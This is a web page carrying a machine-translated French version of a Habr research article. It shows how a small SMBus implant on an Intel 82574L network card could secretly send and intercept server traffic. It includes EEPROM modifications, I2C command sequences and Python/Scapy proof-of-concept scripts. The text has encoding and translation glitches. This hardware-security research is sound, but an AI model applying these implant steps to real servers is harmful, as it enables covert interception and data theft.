<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ü•ä üö∫ üì• Fabriquer son propre implant pour l'√©lectronique üëö üë©üèø‚Äçü§ù‚Äçüë®üèª üê≠</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="L'histoire de Bloomberg selon laquelle certains implants auraient √©t√© install√©s sur les cartes m√®res [les Chinois ont utilis√© une puce pour contr√¥ler ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Fabriquer son propre implant pour l'√©lectronique</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/429190/"><img src="https://habrastorage.org/webt/0b/ft/fa/0bftfawizhuqj5ah4gu_9z1tzak.png"><br><br>  L'histoire de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Bloomberg selon</a> laquelle certains implants auraient √©t√© install√©s sur les cartes m√®res [les <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Chinois ont utilis√© une puce pour contr√¥ler les ordinateurs am√©ricains</a> ] n'est pas pass√©e inaper√ßue.  Apr√®s cela, de nombreuses personnes ont partag√© des id√©es sur la possibilit√© de cr√©er de tels implants (leur taille estim√©e, leurs capacit√©s ou leur m√©thode de d√©tection). <br><br>  Quelques jours plus tard, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">le</a> magazine <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Bloomberg</a> a publi√© un article avec des preuves suppl√©mentaires.  Voici ce qui a sp√©cifiquement suscit√© notre int√©r√™t: <br><blockquote>  Le serveur juridique a envoy√© des messages dans un sens, l'implant dans l'autre, mais il semblait que tout le trafic provenait d'un serveur de confiance. </blockquote><br><a name="habracut"></a><br>  Il existe des moyens d'interagir avec la carte r√©seau directement depuis la carte m√®re.  Plusieurs personnes ont indiqu√© que vous pouvez jouer avec le BMC (Baseboard Management Controller - un composant qui permet d'acc√©der au serveur en plus du canal principal), ce qui permettra √† l'implant de contr√¥ler le BMC et d'acc√©der √† la carte r√©seau.  Mais comment cela fonctionne-t-il dans la pratique?  Voyons voir si nous pouvons reproduire cela. <br><br><h2>  Position de d√©part </h2><br>  Examinons les interfaces possibles entre la carte <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">r√©seau</a> (NIC) et le BMC.  L'un des principaux protocoles pour travailler sur un canal d√©di√© est l'interface de gestion de plateforme IPMI intelligente. <br><br><h3>  IPMI </h3><br>  Selon Wikipedia, IPMI est ¬´une interface de gestion de plate-forme intelligente con√ßue pour surveiller et g√©rer de mani√®re autonome des fonctionnalit√©s int√©gr√©es directement dans le mat√©riel et le micrologiciel des plates-formes de serveur.  Les principales fonctionnalit√©s d'IPMI sont la surveillance, la restauration des fonctions de gestion, la journalisation et l'inventaire, qui sont disponibles ind√©pendamment du processeur, du BIOS et du syst√®me d'exploitation.  Les fonctionnalit√©s de gestion de plateforme peuvent √™tre disponibles m√™me lorsque le syst√®me est √©teint. ¬ª  Tr√®s similaire √† ce dont nous avons besoin. <br><br>  L'organigramme suivant montre un chemin possible de mise en ≈ìuvre du projet: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/33c/3e3/2f6/33c3e32f69cf311114455fe1fb98d5a1.png"><br><br>  IPMI d√©finit en fait deux canaux de bande lat√©rale pour la carte r√©seau: SMBus et NC-SI.  NC-SI est un remplacement SMBus de pointe prenant en charge des vitesses de transfert de donn√©es am√©lior√©es et d'autres nouvelles fonctionnalit√©s.  Le probl√®me est qu'elle a besoin de plus de signaux (environ 10), et il est beaucoup plus difficile d'intervenir dans son travail lorsque nous travaillons avec un implant.  Alors pour l'instant, nous allons nous attarder sur SMBus. <br><br><h3>  SMBus </h3><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">SMBus</a> (System Management Bus) est un protocole de communication s√©rie pour les p√©riph√©riques d'alimentation.  Bus simple √† deux fils unilat√©ral offrant des communications simples.  Le plus souvent utilis√© dans les ordinateurs pour connecter la carte m√®re √† une source d'alimentation et envoyer des instructions on / off.  Bas√© sur le bus <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">I <sup>2</sup> C</a> , couramment utilis√© dans les microcontr√¥leurs.  L'interface n'a besoin que de deux signaux (fr√©quence d'horloge et donn√©es) et le troisi√®me signal est une interruption.  Parfait pour le protocole des jeux d'implants. <br><br><h2>  Premier contact </h2><br>  Vous devez √™tre intelligent, ne pas avoir acc√®s √† la carte m√®re avec BMC.  En √©tudiant les caract√©ristiques techniques des cartes m√®res de serveurs, nous avons constat√© que certaines d'entre elles utilisent la puce <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Intel 82574L</a> .  Selon la <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">documentation</a> , il fournit ¬´l'interface d'intercommunication avanc√©e SMBus¬ª - exactement ce dont vous avez besoin.  Et surtout, il est disponible au format carte PCI-E. <br><br><h3>  Acc√®s SMBus </h3><br>  Nous sommes all√©s au magasin et nous avons <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">maintenant des</a> cartes <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Intel EXPI9301CTBLK</a> avec la puce 82574L.  Et maintenant <br><br>  La documentation peut suivre SMB_DAT et SMB_ALRT_N.  Heureusement, ils se sont tous av√©r√©s disponibles au niveau des plots de contact.  Tout semble assez simple. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e71/6a5/467/e716a54673d59b3aec0c9e34765ef734.jpg"><br>  <i>PCB NIC.</i>  <i>En haut √† gauche - EEPROM, en haut √† droite - connecteur pour SMBus [ALRT | CLK | DAT].</i>  <i>Veuillez noter que R39 et R40 sont scell√©s, ce qui interdit l'acc√®s √† SMBus pour le connecteur PCIe.</i> <br><br>  Nous avons connect√© la <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">sonde I <sup>2</sup> C</a> et scann√© le SMBus, mais nous n'avons rien compt√© d'utile.  La documentation indique que SMBus n'est activ√© que lorsqu'un registre de bits sp√©cifique est d√©fini.  Cette valeur est charg√©e √† partir de l'EEPROM.  Il est temps de creuser plus profond√©ment. <br><br><h3>  Activer l'acc√®s √† SMBus </h3><br>  La documentation nous aide √† nouveau.  L'acc√®s √† SMBus est d√©termin√© par la valeur du registre charg√© √† partir de l'EEPROM NIC.  Heureusement, l'EEPROM peut √™tre lu avec flashrom.  En vidant le contenu de l'EEPROM, nous pouvons analyser et modifier les valeurs: <br><br> <code>&gt; ./flashrom -p buspirate_spi:dev=/dev/hydrabus --read /tmp/flash.dump <br> flashrom p1.0-87-g9891b75-dirty on Linux 4.18.12-arch1-1-ARCH (x86_64) <br> flashrom is free software, get the source code at https://flashrom.org <br> <br> Using clock_gettime for delay loops (clk_id: 1, resolution: 1ns). <br> Found Winbond flash chip "W25X40" (512 kB, SPI) on buspirate_spi. <br> Reading flash... done.</code> <br> <br>  A en juger par la carte NVM (chapitre 6.1 de la documentation), il est clair que nous devons changer deux valeurs: <br><br><ul><li>  Init Control Word 2 [MNGM] (Fiche technique chapitre 6.1.1.6) </li><li>  Compatibilit√© [ASF SMBus Connected] (Fiche technique chapitre 6.1.2.1.1) </li><li>  Compatibilit√© [SMBus Connected] (chapitre 6.1.2.1.1 de la fiche technique) </li></ul><br>  Il suffit de consid√©rer qu'en EEPROM les donn√©es sont stock√©es en petit format endian. <br><br>  Apr√®s cela, nous devons encore g√©rer la valeur de la somme de contr√¥le.  Le chapitre 6.1.2.11 indique que la somme de tous les mots dans la plage [0x00-0x40] doit √™tre 0xBABA.  Un peu de Python nous aidera √† calculer la somme de contr√¥le correcte: <br><br> <code>import struct <br> data = open('/tmp/flash.mod', 'rb').read() <br> tot = 0 <br> for i in range(0x3f): <br> tot = (tot + struct.unpack('&lt;H',data[2*i:(2*i)+2])[0]) &amp; 0xffff <br> <br> print("Checksum word must be : " + hex(0xbaba-tot)) <br> #Checksum word must be : 0x9efb</code> <br> <br>  Et enfin, tous nos changements pour l'EEPROM: <br><br> <code>&lt; 00000000: 6805 ca89 b22e 2004 46f7 8010 ffff ffff h..... .F....... <br> &gt; 00000000: 6805 ca89 b22e 3014 46f7 8010 ffff ffff h.....0.F....... <br> &lt; 00000010: 69e4 0881 6b02 1fa0 8680 d310 ffff 5a9c i...k.........Z. <br> &gt; 00000010: 69e4 0881 6b02 1fa0 8680 d310 ffff 5adc i...k.........Z. <br> <br> &lt; 00000070: ffff ffff ffff ffff ffff 3001 ffff 0bef ..........0..... <br> &gt; 00000070: ffff ffff ffff ffff ffff 3001 ffff fb9e ..........0.....</code> <br> <br>  Apr√®s avoir apport√© des modifications et flash√© l'EEPROM, nous avons connect√© une sonde I <sup>2</sup> C et: <br><br> <code>i2c1&gt; scan <br> Device found at address 0x49 <br> i2c1&gt;</code> <br> <br>  L'adresse I <sup>2</sup> C est cod√©e sur sept bits, l'adresse dont nous avons besoin est obtenue comme 0x49 &lt;&lt; 1 = 0x92. <br><br>  Nous avons maintenant un diagramme de travail pour notre implant.  Nous pouvons envoyer des commandes au NIC: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/13c/bfc/f14/13cbfcf14267b6055c8dc5760b59e2fd.jpg"><br><br><h2>  Recevoir des informations </h2><br>  Comme vous l'avez peut-√™tre devin√©, nous avons continu√© √† lire la documentation et √† envoyer des commandes sp√©cialement pr√©par√©es au NIC pour v√©rifier que tout fonctionnait comme pr√©vu. <br><br>  La documentation d√©crit tout ce que vous devez savoir sur le format de transaction au chapitre 8.4.4.  La seule diff√©rence est que nous n'avons pas besoin de calculer la PEC (somme de contr√¥le pour SMBus, qui est calcul√©e pour chaque paquet).  Par exemple, nous pouvons envoyer la commande CMD √† l'adresse <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" class="user_link">SLAVE en</a> utilisant la s√©quence suivante: <br><br> <code>[START] [@SLAVE] [CMD] ( [START] [@SLAVE] [READ_DATA] ) [STOP]</code> <br> <br>  [START] et [STOP] sont les conditions START et STOP d√©finies par I <sup>2</sup> C. <br><br>  Par exemple, la commande pour lire l'adresse MAC (d√©crite au chapitre 8.8.2.3) sera 0xD4.  Nous envoyons la commande √† SMBus en mode I <sup>2</sup> C: <br><br> <code>[START] [0x92] [0xD4] [START] [0x92] [read 8 bytes] [STOP]</code> <br> <br>  Une fois transf√©r√© aux √©quipes Hydrabus, ce sera: <br><br> <code>i2c1&gt; [ 0x92 0xd4 [ 0x92 hd:2 hd:6 ] <br> I2C START <br> WRITE: 0x92 ACK 0xD4 ACK &lt;== [NIC address] [command] <br> I2C START &lt;== Switch state <br> WRITE: 0x92 ACK &lt;== [NIC address] <br> 07 D4 | .. &lt;== Read [length] [header] <br> 68 05 CA 89 B2 2E | h..... &lt;== Read MAC address bytes <br> NACK <br> I2C STOP</code> <br> <br>  Et, oui, nous obtenons notre adresse MAC! <br><br><h2>  Faire un implant </h2><br>  Maintenant, sachant comment vous pouvez communiquer avec la carte r√©seau, voyons comment vous pouvez utiliser ce canal pour voler le trafic r√©seau et envoyer des donn√©es sur le r√©seau.  Le chapitre 8 de la documentation d√©crit tout ce dont vous avez besoin pour ce faire. <br><br><h3>  Envoi de colis </h3><br>  D√©crit aux chapitres 8.6 et 8.8.1.  Nous pouvons simplement cr√©er une trame Ethernet √† l'aide de commandes.  Voici un exemple de script pour <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Hydrabus</a> ou <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Bus Pirate</a> pour envoyer un paquet: <br><br> <code>import serial <br> import struct <br> from scapy.all import * <br> <br> ser = serial.Serial('/dev/ttyACM0',115200) <br> <br> def send_frame(pkt): <br> # Define the frame size <br> pktlen = struct.pack("B", len(pkt)) <br> <br> # Define the data length to be sent <br> fulllen = struct.pack("&gt;h", len(pkt)+3) <br> <br> # I2C write-then-read. Send frame + SMBus header, receive 0 <br> ser.write('\x08'+fulllen+'\x00\x00') <br> ser.write("\x92\xc4"+pktlen+pkt) <br> <br> # If packet has been sent successfully <br> if ser.read(1) == '\x01': <br> print "Send OK" <br> else: <br> print "Error sending" <br> ser.write('\x00') <br> ser.write('\x00') <br> ser.write('\x0F\n') <br> quit() <br> <br> # Open Hydrabus in binary mode <br> for i in xrange(20): <br> ser.write("\x00") <br> if "BBIO1" not in ser.read(5): <br> print "Could not get into binary mode" <br> quit() <br> <br> # Switch to I2C mode <br> ser.write('\x02') <br> if "I2C1" not in ser.read(4): <br> print "Cannot set I2C mode" <br> quit() <br> <br> #Create the frame to send <br> p = Ether(src="11:22:33:44:55:66", dst="ff:ff:ff:ff:ff:ff") / IP(src="10.31.32.82", dst="10.31.32.80")/ICMP() <br> <br> #Send the frame <br> send_frame(str(p)) <br> <br> # Return to main binary mode <br> ser.write('\x00') <br> #reset to console mode <br> ser.write('\x0F\n')</code> <br> <br>  Apr√®s avoir ex√©cut√© le script, vous pouvez voir le package provenant de la machine avec l'implant et, plus int√©ressant encore, le serveur lui-m√™me ne voit pas du tout ce package: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/ea1/947/4f2/ea19474f2a801afddb732624fa1f3d40.png"><br>  <i>Tcpdump depuis la machine de l'attaquant √† gauche, serveur √† droite</i> <br><br><h3>  Forfaits de lecture </h3><br><h4>  Filtrage </h4><br>  Pour savoir quelles trames doivent aller √† SMBus, la carte r√©seau utilise des filtres de contr√¥le.  Ils mappent le trafic provenant du r√©seau et le redirigent vers PCIe, ou vers SMBus, ou les deux l√† et l√†.  De notre point de vue, cela nous donne une grande flexibilit√©: <br><br><ul><li>  Vous pouvez suivre le trafic en d√©finissant un filtre qui le scannera et le redirigera vers PCIe et SMBus. </li><li>  Vous pouvez faire dispara√Ætre le trafic en le dirigeant uniquement vers SMBus. </li><li>  Vous pouvez cr√©er un canal cach√© qui ne sera pas visible pour le serveur avec l'implant. </li></ul><br>  Plus int√©ressant encore, le filtre peut √™tre configur√© pour suivre divers √©l√©ments du cadre: <br><br><ul><li>  Port UDP / TCP </li><li>  VLAN </li><li>  IPv4 - IPv6 </li><li>  Adresse MAC </li><li>  ... </li></ul><br>  (Pour une liste compl√®te, voir le chapitre 8.4.2.1) <br><br>  Sept filtres MDEF ind√©pendants [0: 6] sont disponibles, et chacun d'eux peut √™tre configur√© pour rediriger le trafic correspondant vers PCIe sur SMBus en utilisant le registre MANC2H (pour plus de d√©tails, voir le chapitre 8.4.3). <br><br><h4>  Impl√©mentation </h4><br>  Il s'est av√©r√© assez difficile de tout configurer correctement, nous avons essay√© de nombreuses combinaisons diff√©rentes pour faire fonctionner le filtre.  Heureusement, la <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">note</a> sur <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">l'application d'</a> Intel nous a donn√© plus de d√©tails sur la fa√ßon d'ex√©cuter les filtres de la mani√®re dont nous avons besoin. <br><br>  En utilisant notre sonde I <sup>2</sup> C, nous pouvons configurer tout cela avec quatre commandes: <br><br> <code>//    <br> [ 0x92 0xca 0x01 0x40 ] <br> //  MDEF[0]   ,   UDP/664  UDP/623 <br> [ 0x92 0xcc 0x06 0x61 0x00 0x00 0x00 0x0c 0x00 ] <br> //  MANC2H      <br> [ 0x92 0xcc 0x05 0x0a 0x00 0x00 0x00 0x00 ] <br> //   (SMBus alerting, status reporting / Enable) <br> [ 0x92 0xca 0x01 0x45 ]</code> <br> <br>  Comme d√©crit au chapitre 8.8.1.3, il est n√©cessaire de r√©gler plusieurs bits afin de permettre la r√©ception des donn√©es et de renvoyer les trames √† notre implant.  Nous avons choisi l'alerte SMBus car d'autres mod√®les permettent √† la carte r√©seau de faire des requ√™tes asynchrones √† SMBus (pour plus de d√©tails, voir le chapitre 8.4.5). <br><br><h4>  Cadres de lecture </h4><br>  Puisque nous avons utilis√© la m√©thode d'alerte SMBus, nous devions nous attendre √† ce que le signal SMB_ALRT_N s'√©teigne avant d'envoyer la commande Receive TCO Packet.  Si nous attendions trop longtemps, le paquet serait rejet√© par la carte r√©seau. <br><br>  Pour illustrer simplement le diagramme, nous enverrons des trames p√©riodiquement et enverrons des commandes de lecture - juste pour confirmer que ce principe fonctionne.  Le sch√©ma ressemble √† ceci: <br><br><ul><li>  Un serveur avec un implant poss√®de des filtres qui surveillent le trafic avec UDP / 623 (chapitre 3.6.1.2). </li><li>  L'implant est simul√© √† l'aide d'Hydrabus. </li><li>  Un autre serveur envoie des paquets qui tombent sous le filtre √† l'aide du script Scapy: </li></ul><br> <code>from scapy.all import * <br> p=Ether()/IP(dst="10.31.32.81")/UDP(dport=0x26f)/"MALICIOUS PAYLOAD" <br> while(1):sendp(p)</code> <br> <br>  Il s'av√®re que quelque chose d'int√©ressant: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e03/407/a68/e03407a6872fbeda15ad73fa32c87257.png"><br><br>  √Ä gauche, SMBus lit la trame; les donn√©es de trame sont affich√©es ci-dessous.  √Ä droite, tcpdump, ex√©cut√© sur un serveur avec un implant, n'affiche pas les trames entrantes. <br><br><h4>  Relais de trame </h4><br>  En modifiant le registre MANC2H, il est possible de s'assurer que le trafic envoy√© vers SMBus et PCIe est correctement affich√© sur le serveur.  Par exemple, cr√©ons un filtre d'interception qui r√©pond au trafic UDP / 161 (SNMP) et l'envoie √† SMBus et PCIe: <br><br> <code>//    <br> [ 0x92 0xca 0x01 0x40 ] <br> //  - 0   161 (0xa1) <br> [ 0x92 0xcc 0x04 0x63 0x00 0x00 0xa1 ] <br> //  MDEF[0]   ,   - 0 <br> [ 0x92 0xcc 0x06 0x61 0x00 0x00 0x00 0x10 0x00 ] <br> //  MANC2H     MDEF[0]  PCIe <br> [ 0x92 0xcc 0x05 0x0a 0x00 0x00 0x00 0x00 ] <br> //   (SMBus alerting, status reporting / Enable) <br> [ 0x92 0xca 0x01 0x45 ]</code> <br> <br>  En activant les filtres, nous pouvons envoyer une demande SNMP au serveur avec l'implant et voir le paquet qui a intercept√© l'implant.  Dans le m√™me temps, le serveur r√©pond √† la demande - ce qui signifie que le paquet a √©t√© correctement redirig√© vers SMBus et PCIe: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e32/d3b/281/e32d3b281a556bd1bcdebe86498a2dc1.png"><br>  <i>Ci-dessus, une requ√™te SNMP intercept√©e de l'implant.</i>  <i>Ci-dessous - la requ√™te SNMP a atteint le serveur.</i> <br><br><h2>  Conclusions </h2><br>  Nous avons d√©crit une m√©thode possible pour introduire un microcontr√¥leur petit et peu co√ªteux comme implant au niveau NIC.  Un tel implant n√©cessite au moins quatre contacts (Vcc, GND, CLK, DAT), et il peut contr√¥ler la carte serveur.  Parmi ses caract√©ristiques: <br><br><ul><li>  √âcoute du trafic r√©seau entrant vers le serveur. </li><li>  Recevoir des commandes du r√©seau √† l'insu du serveur. </li><li>  Transmission de donn√©es sur le r√©seau √† l'insu du serveur. </li></ul><br>  Dans notre exemple, pour simplifier, Hydrabus a √©t√© utilis√© comme interface pour I <sup>2</sup> C / SMBus, mais cela peut √™tre fait tout aussi facilement sur un petit microcontr√¥leur, par exemple ATtiny85 (il s'agit de la taille d'une EEPROM pour NIC). <br><br>  Cependant, dans la vraie vie, l'acc√®s √† un tel implant ne serait que pour SMBus.  Selon le sch√©ma de la carte m√®re, ce p√©riph√©rique peut √™tre le seul disponible, et l'interaction avec le syst√®me d'exploitation du serveur sera alors impossible.  Dans le cas o√π un contr√¥le total sur le syst√®me d'exploitation est requis, il est pr√©f√©rable de changer le code BMC, car il a d√©j√† acc√®s √† tous les bus int√©ressants, et il ne laisse pas de traces visibles sur la carte m√®re. <br><br>  Un autre inconv√©nient d'un tel implant est qu'il peut transmettre des donn√©es √† des vitesses de l'ordre de 100 Kb / s, ce qui n'est pas suffisant pour une √©tude compl√®te du trafic.  De plus, l'implant est capable d'intercepter uniquement le trafic provenant du r√©seau.  En cons√©quence, cette solution semble inefficace par rapport aux efforts n√©cessaires √† sa mise en ≈ìuvre dans l'√©quipement cible. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr429190/">https://habr.com/ru/post/fr429190/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr429180/index.html">Aller √† goto</a></li>
<li><a href="../fr429182/index.html">L'intelligence artificielle s'est heurt√©e √† une barri√®re de compr√©hension</a></li>
<li><a href="../fr429184/index.html">Les m√©dias en ligne rompent de mani√®re pr√©visible la cha√Æne des universitaires Oumuamua et Harvard</a></li>
<li><a href="../fr429186/index.html">@Pythonetc octobre 2018</a></li>
<li><a href="../fr429188/index.html">Pr√©sentation de PICASO 3D Designer XL</a></li>
<li><a href="../fr429192/index.html">Ces nouvelles astuces sont toujours capables de d√©jouer les vid√©os Deepfake.</a></li>
<li><a href="../fr429194/index.html">7 biblioth√®ques pour le d√©veloppement Android sur Kotlin</a></li>
<li><a href="../fr429196/index.html">Exploration mobile d'ex√©cution iOS avec Objection, ou pirater notre propre application</a></li>
<li><a href="../fr429198/index.html">Le framework Kernel-Bridge: Bridge in Ring0</a></li>
<li><a href="../fr429202/index.html">Cours co√ªteux: √ßa vaut le coup?</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>